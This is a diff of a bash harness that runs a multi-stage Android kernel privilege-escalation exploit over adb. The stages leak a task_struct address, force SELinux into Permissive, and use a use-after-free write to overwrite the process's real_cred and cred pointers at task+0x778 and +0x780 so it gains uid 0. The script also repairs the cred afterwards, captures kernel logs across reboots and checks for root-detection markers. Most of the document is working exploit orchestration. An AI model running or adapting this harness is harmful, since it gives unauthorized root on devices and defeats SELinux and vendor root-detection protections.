@@ -1,65 +1,65 @@
 #!/bin/bash
-# run_bootA.sh — ONE boot, ONE question, ONE shot.
+# run_bootA.sh — ONE boot, ONE shot per offset.
 #
-#   "does a single 0x778 PI write, whose write_value is a sprayed HEAP pointer
-#    instead of the init_cred image, reboot the machine?"
+#   "does a PI write whose write_value is a sprayed HEAP pointer, rather than the
+#    init_cred image, reboot the machine?"
 #
-# Design rules (2026-09-18, after the first two attempts):
-#   * The kernel log is streamed to the HOST (`adb exec-out cat /dev/kmsg`).
-#     It must never live only on the device: the ring buffer dies with the
-#     reboot, and the reboot IS the event.  `dmesg -w` is a no-op on toybox.
-#   * One shot per boot.  No retry rounds, and NEVER SIGKILL a writer whose
-#     three-thread futex protocol may still be live — that tears down half a
-#     wait queue.  The old runners retried because `probe_state` said "miss",
-#     but W1 proved `probe_state` is not a "did it land" signal.
-#   * The judge is the target's own readback, and the GATE is after 0x780 +
-#     repair, never after 0x778:
-#       /proc/<pid>/status Uid  <- real_cred (task+0x778)   [recorded as data]
-#       the child's getuid()    <- cred      (task+0x780)   [the real gate]
-#     (procfs really does read real_cred -- get_task_cred() in this image loads
-#      task+0x778 -- but the write commits asynchronously, so an early read is
-#      not a verdict either way.  Poll it, record it, do not abort on it.)
-#   * The writer must not sit in sleep(HOLD): V12_PIN_FORK=1 forks a pin child
-#     that inherits the sockets, so the payload page stays alive while the
-#     writer returns immediately.
+# Design rules (2026-09-18):
+#   * ONE shot per offset (ROUNDS=1).  No SIGKILL — a writer whose three-thread
+#     futex protocol may still be live must be allowed to exit on its own, and
+#     V12_PIN_FORK=1 keeps the payload page alive after it does.
+#   * The judge is the target's own readback: /proc/<pid>/status Uid for
+#     real_cred (task+0x778), the child's own getuid() for cred (task+0x780).
+#     `probe_state` is NOT consulted (W1 landed while reporting R).
+#   * The kernel log is captured to the HOST and deduped by KERNEL TIMESTAMP,
+#     not by a line counter.  A counter is wrong here: the ring buffer is full
+#     and churning, so `dmesg | wc -l` oscillates down by a line or two, and a
+#     "count went down -> reset" rule re-appends the whole buffer.  Run 7 did
+#     exactly that: 799 212 lines for 24 853 unique, ~73 MB, and it saturated
+#     adb so badly that each shot took 80-95 s instead of ~15 s.
+#   * The poller is PAUSED while a shot is in flight — adb is the contended
+#     resource, and the shot is what we are timing.
 #
-# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= CONTROL=1
-#   CONTROL=1 fires the single 0x778 shot with V12_ALLOW_INIT_CRED=1, i.e.
-#   write_value = the init_cred image instead of a sprayed page.  It REPLACES
-#   the normal shot, it does not add one — run it as its own boot, and only
-#   after a boot in which the sprayed-page shot did NOT reboot:
-#     sprayed-page shot reboots, init_cred shot does not  -> the problem is the
-#       IDENTITY of write_value, not the UAF.
-#     both reboot                                          -> the problem is the
-#       protocol/retry/capture, independent of the cred content.
+# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= NODRAIN= ROUNDS= CONTROL=1
+#   NODRAIN=1 (default) skips slab_drain() — 5 waves x 400 forked children, each
+#     pause()d then SIGKILLed, at the start of every W7 invocation.  This is the
+#     single heaviest difference between the boots that rebooted and run 7 which
+#     did not, so NODRAIN=0 is the control to try next.
+#   ROUNDS=n allows up to n shots at the same offset (no kill between them, stop
+#     as soon as the readback moves).  Default 1.
+#   CONTROL=1 fires the 0x778 shot with V12_ALLOW_INIT_CRED=1 (write_value = the
+#     init_cred image).  It REPLACES the normal shot; run it as its own boot, and
+#     only after a boot in which a sprayed-page write LANDED and did not reboot.
 set -u
 export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"
 
 ADB=${ADB:-adb}
 SER=${SER:-$( "$ADB" devices 2>/dev/null | sed -n "2s/[[:space:]].*//p" )}
 DEV=/data/local/tmp
-# A run-unique tag on EVERY device-side path.  After one of these events the
-# files in /data/local/tmp can become root-owned and un-statable for shell
-# (`adb push` then fails with "stat failed ... Permission denied", `rm`/`mv`
-# fail too), so reusing a fixed name poisons the next run.  Same reason the
-# per-shot evidence path below is unique.
+# Run-unique device-side paths: after one of these events /data/local/tmp files
+# can become root-owned and un-statable for shell, so a fixed name poisons every
+# later run (adb push then fails with "stat failed ... Permission denied").
 TAG=${TAG:-$(date +%m%d_%H%M%S)}
-BIN=$DEV/glxA_$TAG       # LT + W1
-BINW=$DEV/glxW_$TAG      # W7 only
+BIN=$DEV/glxA_$TAG
+BINW=$DEV/glxW_$TAG
 EV=$DEV/bootA_ev_$TAG.txt
 TASKF=$DEV/bootA_task_$TAG.txt
 RES=$DEV/bootA_res_$TAG.txt
 OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
 HOLD=${HOLD:-20}
 CHAINWAIT=${CHAINWAIT:-4000}
+NODRAIN=${NODRAIN:-1}
+ROUNDS=${ROUNDS:-1}
 CONTROL=${CONTROL:-0}
 KLOG=$OUT/klog.host
+POLLPID=""
 mkdir -p "$OUT"
 
 A() { "$ADB" -s "$SER" shell "$@"; }
 say() { echo "[$(date +%H:%M:%S)] $*"; }
 detach() { timeout 15 "$ADB" -s "$SER" shell "$1" >/dev/null 2>&1 || true; }
 uid_line() { A "grep -m1 '^Uid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
+alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }
 svc_count() {
     local n=0 s
     for s in package power input phone wifi; do
@@ -68,6 +68,37 @@ svc_count() {
     echo "$n"
 }
 
+# ---- kernel log: host-side poll, deduped by kernel timestamp ----------------
+start_klog() {
+    [ -n "$POLLPID" ] && return 0
+    ( while :; do
+          last=$(tail -1 "$KLOG" 2>/dev/null | sed -n 's/^\[ *\([0-9][0-9.]*\)\].*/\1/p')
+          [ -z "$last" ] && last=0
+          t3=$( "$ADB" -s "$SER" shell "dmesg | tail -n 2000" 2>/dev/null | tr -d '\r' )
+          [ -z "$t3" ] && { sleep 5; continue; }
+          mt=$(printf '%s\n' "$t3" | tail -1 | sed -n 's/^\[ *\([0-9][0-9.]*\)\].*/\1/p')
+          [ -z "$mt" ] && mt=0
+          # timestamps went BACKWARDS -> the box rebooted; start a fresh capture
+          if awk -v a="$mt" -v b="$last" 'BEGIN{exit !(a+0 < b+0)}'; then
+              printf '\n### [poll] kernel timestamps went backwards (%s < %s) - reboot seen at %s\n\n' \
+                     "$mt" "$last" "$(date +%H:%M:%S)" >> "$KLOG"
+              last=0
+          fi
+          printf '%s\n' "$t3" | awk -v t="$last" '
+              {
+                  if ($0 ~ /^\[ *[0-9]+\.[0-9]+\]/) {
+                      ts=$0; sub(/^\[ */,"",ts); sub(/\].*/,"",ts); ts=ts+0
+                      keep = (ts > t) ? 1 : 0
+                  }
+                  if (keep) print
+              }' >> "$KLOG"
+          sleep 5
+      done ) &
+    POLLPID=$!
+}
+stop_klog() { [ -n "$POLLPID" ] && kill "$POLLPID" 2>/dev/null; POLLPID=""; }
+
+# ---------------------------------------------------------------- preflight
 say "=== preflight ==="
 "$ADB" devices | grep -q "$SER" || { echo "device $SER not attached"; exit 1; }
 A 'uname -r; getenforce; cat /proc/sys/kernel/random/boot_id; uptime; cat /proc/loadavg' \
@@ -79,11 +110,11 @@ A "chmod 755 $BIN $BINW"
 # ---------------------------------------------------------------- 1. Permissive
 say "=== step 1: SELinux Permissive ==="
 if [ "$(A 'getenforce' | tr -d '\r')" = "Permissive" ]; then
-    say "  already Permissive — skipping W1 entirely (no timeout 190 ./$(basename $BIN) W1)"
+    say "  already Permissive — skipping W1 entirely"
 else
     W1OK=0
     for r in 1 2 3 4 5 6 7 8; do
-        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev_$TAG.txt timeout 190 ./$(basename $BIN) W1 >/dev/null 2>&1"
+        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev_$TAG.txt timeout 190 ./$(basename "$BIN") W1 >/dev/null 2>&1"
         EN=$(A 'getenforce' | tr -d '\r')
         say "  W1 round $r: $EN"
         [ "$EN" = "Permissive" ] && { W1OK=1; break; }
@@ -92,33 +123,16 @@ else
     [ "$W1OK" = 1 ] || { say "!! not Permissive — stopping"; exit 2; }
 fi
 
-# ---------------------------------------------------------------- 2. HOST klog
-# A real stream, not a device-side file.  If the box reboots, the last lines in
-# this file ARE the reboot, and they are already on the host.
-# /dev/kmsg is "Permission denied" on this device EVEN UNDER PERMISSIVE
-# (measured 2026-09-18: `head -c1 /dev/kmsg` -> Permission denied, while
-# `dmesg | wc -l` -> 21143).  So `adb exec-out cat /dev/kmsg` — the obvious
-# stream — does not work here, and `dmesg -w` is a no-op anyway (toybox ignores
-# -w).  The only capture that works is a POLL of `dmesg`, run from the HOST so
-# that each round's delta is already on the host disk before the next round.
-# That is what makes the last lines before a reboot survive it.
-say "=== step 2: host-side kernel log (dmesg poll -> $KLOG) ==="
+# ---------------------------------------------------------------- 2. klog
+say "=== step 2: host-side kernel log (dmesg poll, deduped by timestamp) ==="
 if "$ADB" -s "$SER" shell 'head -c1 /dev/kmsg' >/dev/null 2>&1; then
     say "  /dev/kmsg readable — streaming it"
     ( "$ADB" -s "$SER" exec-out cat /dev/kmsg >> "$KLOG" 2>/dev/null ) &
+    POLLPID=$!
 else
     say "  /dev/kmsg NOT readable (expected here) — polling dmesg from the host"
-    ( n=0; while :; do
-          c=$( "$ADB" -s "$SER" shell "dmesg > $DEV/_kp.txt 2>/dev/null; wc -l < $DEV/_kp.txt" 2>/dev/null | tr -d '\r' | head -1 )
-          if [ -n "${c:-}" ]; then
-              [ "$c" -lt "$n" ] && n=0
-              "$ADB" -s "$SER" shell "tail -n +$((n+1)) $DEV/_kp.txt" 2>/dev/null | tr -d '\r' >> "$KLOG"
-              n=$c
-          fi
-          sleep 2
-      done ) &
+    start_klog
 fi
-KLOGPID=$!
 sleep 5
 say "  klog lines after 5s: $(wc -l < "$KLOG")"
 
@@ -134,8 +148,8 @@ done
 # ---------------------------------------------------------------- 4. LT
 say "=== step 4: LT child (pure userspace spin, NO_EXEC) ==="
 TASK=""; CPID=""; PPID_LT=""
-for attempt in $(seq 1 12); do   # the perf leak is probabilistic and currently flaky; each try is ~30s
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev.txt V12_NO_EXEC=1 ./$(basename $BIN) LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
+for attempt in $(seq 1 12); do
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev_$TAG.txt V12_NO_EXEC=1 ./$(basename "$BIN") LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
     for i in $(seq 1 25); do
         sleep 1
         TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
@@ -144,55 +158,15 @@ for attempt in $(seq 1 12); do   # the perf leak is probabilistic and currently 
     [ -n "$TASK" ] && break
     say "  LT attempt $attempt rejected: $(A "grep -m1 suspicious $DEV/bootA_lt_$TAG.log 2>/dev/null" | tr -d '\r')"
 done
-[ -z "$TASK" ] && { say "!! no task leak — stopping"; exit 3; }
+[ -z "$TASK" ] && { say "!! no task leak — stopping"; stop_klog; exit 3; }
 LTLOG=$(A "cat $DEV/bootA_lt_$TAG.log 2>/dev/null")
 CPID=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT child_task = 0x[0-9a-f]* pid=\([0-9]*\).*/\1/p' | head -1)
 PPID_LT=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT parent pid=\([0-9]*\) child=.*/\1/p' | head -1)
 say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
 say "  baseline: $(uid_line "$CPID")"
 
-# ---------------------------------------------------------------- 5. one shot
-# Fire once, read the evidence as soon as the parameters are printed (do NOT
-# wait for probe_state — it is not a verdict), then let the writer exit by
-# itself.  Nothing is killed.
-shot() {  # $1=off $2=extra $3=tag -> echoes the write value it used
-    local off=$1 extra=$2 tag=$3
-    # A UNIQUE evidence path per shot.  Reusing one file means that if `rm -f`
-    # fails (a previous event can leave /data/local/tmp files root-owned and
-    # un-statable for shell), the poll reads the PREVIOUS shot's output and
-    # breaks immediately with the wrong content.
-    local ev="$DEV/bootA_ev_${TAG}_$tag.txt"
-    A "rm -f $ev 2>/dev/null; true"
-    say "  [$tag] firing ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s ${extra:-}"
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=1 $extra V12B_EVIDENCE=$ev ./$(basename $BINW) W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
-    local i out=""
-    for i in $(seq 1 15); do            # capped at 15 s, not 90
-        sleep 1
-        out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
-        printf '%s' "$out" | grep -q 'write value' && break
-    done
-    sleep 2                             # let the store commit before judging
-    out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
-    printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
-    grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|side effect|REFUSED|PIN child|HOLD' \
-        "$OUT/w7_$tag.txt" | sed 's/^/    /'
-    printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1
-}
-
-# Uid: in /proc/<pid>/status reads real_cred (task+0x778), NOT cred (task+0x780).
-# Proven twice: get_task_cred() in this kernel image does `add x9,x0,#0x778;
-# ldar x19,[x9]`, and task_state() then dereferences that pointer at exactly the
-# cred field offsets ([+4] uid, [+0x14] euid, [+0xc] suid, [+0x1c] fsuid, [+8]
-# gid, [+0x18] egid, [+0x10] sgid, [+0x20] fsgid, [+0x90] group_info) -- that is
-# the Uid/Gid/Groups block.  And out/t5_w7_778.txt, a 0x778-ONLY write, moved
-# this very line to `0 0 4294967176 0`.
-#
-# Even so, the write commits ASYNCHRONOUSLY ("chain async commit" in the code),
-# so a fixed 2 s read can miss a write that did land -- that is the real way to
-# get a false "did not take".  So: poll for a bounded window, record the result
-# as DATA, and never abort the sequence on it.  The gate is after 0x780 +
-# repair, because that is what getuid() reads.
-poll_uid() {   # $1=pid $2=timeout_s
+# ---------------------------------------------------------------- 5. shots
+poll_uid() {   # $1=pid $2=timeout_s -> the first Uid line that is no longer 2000
     local pid=$1 t=$2 i u=""
     for i in $(seq 1 "$t"); do
         u=$(uid_line "$pid")
@@ -203,86 +177,123 @@ poll_uid() {   # $1=pid $2=timeout_s
     done
     echo "$u"
 }
-alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }
 
-say "=== step 5: ONE 0x778 shot (real_cred) ==="
+# one shot; echoes the write value it used.  The poller is PAUSED across it,
+# because adb is the contended resource and the shot is what we are timing.
+shot() {
+    local off=$1 extra=$2 tag=$3
+    local ev="$DEV/bootA_ev_${TAG}_$tag.txt"
+    A "rm -f $ev 2>/dev/null; true"
+    stop_klog
+    say "  [$tag] ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s nodrain=$NODRAIN ${extra:-}"
+    local t0 t1
+    t0=$(date +%s)
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=$NODRAIN $extra V12B_EVIDENCE=$ev ./$(basename "$BINW") W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
+    local i out=""
+    for i in $(seq 1 20); do
+        sleep 1
+        out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
+        printf '%s' "$out" | grep -q 'probe_state' && break
+    done
+    sleep 1
+    out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
+    printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
+    t1=$(date +%s)
+    start_klog
+    say "  [$tag] shot wall-clock: $((t1 - t0))s"
+    grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|PIN child|HOLD|REFUSED' \
+        "$OUT/w7_$tag.txt" | sed 's/^/    /'
+    printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1
+}
+
+# up to $4 shots at one offset; no kill; stop as soon as the readback moves
+shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
+    local off=$1 extra=$2 tag=$3 rounds=${4:-1} r u
+    for r in $(seq 1 "$rounds"); do
+        shot "$off" "$extra" "${tag}r$r" >/dev/null
+        if ! alive; then say "  !! DEVICE GONE after $tag round $r"; exit 5; fi
+        u=$(poll_uid "$CPID" 8)
+        case "$u" in
+            ""|*"2000 2000 2000 2000"*)
+                say "  [$tag] round $r/$rounds: readback unchanged";;
+            *)  say "  [$tag] readback moved on round $r: [$u]"; return 0;;
+        esac
+        [ "$r" -lt "$rounds" ] && sleep 2
+    done
+    return 1
+}
+
+say "=== step 5: 0x778 shot(s) (real_cred) ==="
 if [ "$CONTROL" = "1" ]; then
-    say "  ⚠ CONTROL MODE: V12_ALLOW_INIT_CRED=1 — writing the global init_cred image"
-    shot 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl >/dev/null
+    say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
+    shot_until 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl "$ROUNDS" || true
 else
-    shot 0x778 "" w778 >/dev/null
+    shot_until 0x778 "" w778 "$ROUNDS" || true
 fi
-if ! alive; then say "  !! DEVICE GONE right after the 0x778 shot — that is the event"; exit 5; fi
-say "  polling /proc/$CPID/status Uid for up to 20s (async commit) ..."
-U778=$(poll_uid "$CPID" 20)
-say "  after 0x778: [$U778]"
-case "$U778" in
-  *"0 0"*) say "  → real_cred took.";;
-  *)       say "  → real_cred has not moved (yet).  Recorded as data; NOT aborting —"
-           say "    the gate is 0x780 + repair, which is what getuid() reads.";;
-esac
-say "  machine alive: $(alive && echo yes || echo NO)"
+U778=$(uid_line "$CPID")
+say "  after 0x778: [$U778]   (recorded as data; the gate is 0x780 + repair)"
 
-say "=== step 6: ONE 0x780 shot (cred) ==="
-CRED=$(shot 0x780 "" w780)
-if ! alive; then say "  !! DEVICE GONE right after the 0x780 shot"; exit 5; fi
-U780=$(poll_uid "$CPID" 12)
-say "  after 0x780: [$U780]"
+say "=== step 6: 0x780 shot(s) (cred) ==="
+CRED=""
+if shot_until 0x780 "" w780 "$ROUNDS"; then
+    say "  after 0x780: [$(uid_line "$CPID")]"
+    CRED=$(grep -h -m1 'write value = private cred page' "$OUT"/w7_w780*.txt 2>/dev/null \
+           | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
+else
+    say "  ✗ 0x780 did not move the readback — SKIPPING the repair."
+    say "    The repair only exists to clear cred+8 of the cred that was actually"
+    say "    installed; with nothing installed it repairs a page nobody points at."
+    say "    (Run 7 burned 86 s on exactly that.)"
+fi
 
-say "=== step 7: ONE local repair of that cred's +8 ==="
 if [ -n "$CRED" ]; then
+    say "=== step 7: ONE local repair of cred+8 (cred=0x$CRED) ==="
     shot 0x780 "V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1 V12_W7_REPAIR_ADDR=$CRED" repair >/dev/null
-    if ! alive; then say "  !! DEVICE GONE right after the repair shot"; exit 5; fi
-    UREP=$(poll_uid "$CPID" 12)
-    say "  after repair: [$UREP]"
-else
-    UREP="$U780"
-    say "  !! no cred address captured — skipping repair"
+    alive || { say "  !! DEVICE GONE after the repair shot"; exit 5; }
+    say "  after repair: [$(uid_line "$CPID")]"
 fi
 
-say "=== verdict (gate lives here, not after 0x778) ==="
+say "=== verdict ==="
+UREP=$(uid_line "$CPID")
 RPT=$(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')
 say "  /proc/$CPID/status Uid: [$UREP]"
 say "  child's own report:     [$RPT]"
 case "$UREP$RPT" in
-  *"0 0 0 0"*|*"uid=0"*|*"noexec"*)
-        say "  ★ CRED TOOK — this boot can answer the Boot A question.";;
-  *)    say "  ✗ cred did NOT take in this boot.  One shot was fired per offset,"
-        say "    nothing was killed; take a fresh boot rather than adding rounds.";;
+  *"0 0 0 0"*|*"uid=0"*|*noexec*) say "  ★ CRED TOOK — this boot answered the Boot A question.";;
+  *) say "  ✗ cred did not take in this boot.  Take a fresh boot; do not add rounds.";;
 esac
 
 say "=== step 8: poke LT parent ==="
 [ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
-for i in $(seq 1 20); do
+for i in $(seq 1 15); do
     sleep 1
     R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
     [ -n "$R" ] && { say "  child report: $R"; break; }
 done
 
-say "=== step 9: watch 60s ==="
-for i in $(seq 10 10 60); do
-    sleep 10
+say "=== step 9: watch 15s ==="
+for i in 5 10 15; do
+    sleep 5
     UP=$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')
     [ -z "$UP" ] && { say "  !! device gone at t+${i}s — REBOOT"; break; }
     say "  t+${i}s up=$UP services=$(svc_count)/5"
 done
 
-# ---------------------------------------------------------------- 10. evidence
 say "=== step 10: evidence ==="
-kill "$KLOGPID" 2>/dev/null; wait "$KLOGPID" 2>/dev/null
-say "  klog.host: $(wc -l < "$KLOG") lines"
+stop_klog
+say "  klog.host: $(wc -l < "$KLOG") lines, $(sort -u "$KLOG" 2>/dev/null | wc -l) unique"
 say "  --- reboot / watchdog markers (NOT ROOTCHECK) ---"
-if grep -anE 'sys_reboot|reboot: |Restarting system|Watchdog|watchdog|theia|hung_task|softlockup|soft lockup|panic|Unable to handle|Call trace|BUG:' \
-        "$KLOG" | tail -40 > "$OUT/10_reboot_markers.txt"; then
-    sed 's/^/    /' "$OUT/10_reboot_markers.txt" | tail -25
+if grep -anE 'sys_reboot|reboot: |Restarting system|hung_task|softlockup|soft lockup|Unable to handle|Call trace|BUG:|timestamps went backwards' \
+        "$KLOG" | tail -30 > "$OUT/10_reboot_markers.txt"; then
+    sed 's/^/    /' "$OUT/10_reboot_markers.txt"
 else
     say "    (none)"
 fi
-say "  --- guard markers, for completeness ---"
+say "  --- guard markers ---"
 grep -aE 'ROOTCHECK|oplus_root|sys_call_number|path@@|execve_' "$KLOG" | tail -20 > "$OUT/10_rootcheck.txt"
 if [ -s "$OUT/10_rootcheck.txt" ]; then sed 's/^/    /' "$OUT/10_rootcheck.txt"; else say "    (none)"; fi
 A "getprop ro.boot.bootreason; getenforce; uptime; grep -c '^kernelsu' /proc/modules 2>/dev/null" | tee "$OUT/10_final.txt"
-for f in bootA_lt_$TAG.log bootA_lt_ev.txt bootA_w1_ev_$TAG.txt; do
+for f in bootA_lt_$TAG.log bootA_lt_ev_$TAG.txt; do
     A "cat $DEV/$f 2>/dev/null" | tr -d '\r' > "$OUT/$f"
 done
 say "evidence -> $OUT"
